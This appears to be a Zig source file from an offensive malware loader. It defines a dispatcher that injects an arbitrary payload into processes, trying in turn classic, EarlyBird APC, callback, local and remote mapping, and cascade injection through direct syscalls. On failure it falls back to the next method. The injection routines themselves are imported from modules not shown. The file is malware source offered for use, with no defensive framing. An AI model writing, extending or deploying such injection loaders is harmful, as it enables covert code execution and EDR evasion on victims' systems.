const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("api.zig").Apis;
const Syscalls = @import("syscall.zig").Syscalls;

// Injection techniques
const classic = @import("inject/classic.zig").classic;
const earlybird = @import("inject/earlybird.zig").earlybird;
const callback = @import("inject/callback.zig").callback;
const localMapping = @import("inject/local_mapping.zig").localMapping;
const remoteMapping = @import("inject/remote_mapping.zig").remoteMapping;
const cascade = @import("inject/cascade.zig").cascade;

pub const Inject = struct {
    pub fn run(apis: Apis, syscalls: Syscalls, payload: []const u8) !void {
        // Fallbacks for fail-safe
        for (config.injection_types) |t| {
            switch (t) {
                config.InjectionType.Classic => {
                    classic(syscalls, payload) catch continue;
                    break;
                },
                config.InjectionType.EarlyBird => {
                    earlybird(apis, syscalls, payload) catch continue;
                    break;
                },
                config.InjectionType.Callback => {
                    callback(apis, syscalls, payload) catch continue;
                    break;
                },
                config.InjectionType.LocalMapping => {
                    localMapping(syscalls, payload) catch continue;
                    break;
                },
                config.InjectionType.RemoteMapping => {
                    remoteMapping(syscalls, payload) catch continue;
                    break;
                },
                config.InjectionType.Cascade => {
                    cascade(apis, syscalls, payload) catch continue;
                    break;
                },
            }
        }
    }
};
